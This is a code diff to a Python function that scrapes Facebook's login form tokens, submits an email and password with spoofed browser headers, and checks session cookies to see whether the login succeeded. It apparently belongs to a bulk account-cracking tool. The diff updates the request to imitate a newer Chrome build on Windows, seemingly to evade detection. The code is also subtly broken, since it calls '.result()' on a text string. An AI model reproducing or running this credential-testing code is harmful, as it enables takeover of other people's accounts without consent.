@@ -1495,27 +1495,33 @@ def m6(ids,pwv):
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'email': ids,
-            'login_source': 'comet_headerless_login',
+            'cred_type': '137',
+            'login_source': 'device_based_login',
             'next': '',
+            'persistent': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),}
-            update= {
-            'authority': 'web.facebook.com',
+            update=  {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5',
             'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://web.facebook.com',
-            'referer': 'https://web.facebook.com/?_rdc=1&_rdr',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'dpr': '1',
+            'priority': 'u=0, i',
+            'referer': 'https://www.facebook.com/?stype=lo&deoia=1&jlou=AffopfWl__ceHlWoEkz25kpkLyKGIiZjpWEdKaAllfvZo8m1PUp_AsyfKnRKmnEm4YHAiBoXWhplpSl967-c-sCfMgX_Ce44VhgVRjrbEErH6Q&smuh=38391&lh=Ac_7sehXxT0vRRWa1vc',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="99.0.0.0", "Google Chrome";v="127.0.6533.89", "Chromium";v="127.0.6533.89"',
             'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4425.124 Safari/537.36'}
-            future =session.post('https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzExNTI2MzE4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D',data=info,headers=update).text
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+            'viewport-width': '885',}
+            future =session.post('https://www.facebook.com/login/device-based/regular/login/',data=info,headers=update).text
             response = future.result()
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
